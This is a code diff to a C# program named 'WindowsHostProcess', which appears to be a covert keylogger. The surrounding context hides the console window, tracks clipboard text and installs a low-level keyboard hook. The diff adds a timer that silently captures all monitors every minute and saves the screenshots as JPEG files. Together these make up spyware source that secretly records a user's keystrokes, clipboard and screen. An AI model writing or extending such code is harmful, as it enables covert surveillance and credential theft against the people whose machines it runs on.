@@ -4,6 +4,8 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Text;
+using System.Drawing.Imaging;
+using System.Drawing;
 
 namespace WindowsHostProcess
 {
@@ -18,11 +20,20 @@ namespace WindowsHostProcess
         public static int fstWin = 0;
         public static string clipboardText = "";
         public static string oldClipboardText = "";
+        public static Screen[] zScreen = Screen.AllScreens;
+        public static int screens = zScreen.Length;
 
         [STAThread]
         public static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
+            var startTimeSpan = TimeSpan.Zero;
+            var periodTimeSpan = TimeSpan.FromMinutes(1);
+
+            var timer = new System.Threading.Timer((e) =>
+            {
+                printScreen();
+            }, null, startTimeSpan, periodTimeSpan);
 
             // Hide Window
             ShowWindow(handle, SW_HIDE);
@@ -60,6 +71,36 @@ namespace WindowsHostProcess
                 }                
             }
             return null;
+        }
+
+
+
+        private static void printScreen()
+        {
+            int lowestBound = int.MaxValue;
+            int maxWidth = 0;
+            int maxHeight = 0;
+
+            for (int i = 0; i < screens; i++)
+            {
+                int boundValue = zScreen[i].WorkingArea.X;
+                if (boundValue < lowestBound)
+                    lowestBound = boundValue;
+
+                int currentWidth = zScreen[i].Bounds.Width;
+                if (currentWidth > maxWidth)
+                    maxWidth = currentWidth;
+
+                int currentHeight = zScreen[i].Bounds.Height;
+                if (currentHeight > maxHeight)
+                    maxHeight = currentHeight;
+            }
+
+            Bitmap bitmap = new Bitmap(maxWidth * screens, maxHeight);
+            Graphics graphics = Graphics.FromImage(bitmap as Image);
+            graphics.CopyFromScreen(lowestBound, 0, 0, 0, bitmap.Size);
+            var date = DateTime.Now.ToString("MMddyyHmmss");
+            bitmap.Save(Application.StartupPath + @"\printscreen" + date + ".jpg", ImageFormat.Jpeg);
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
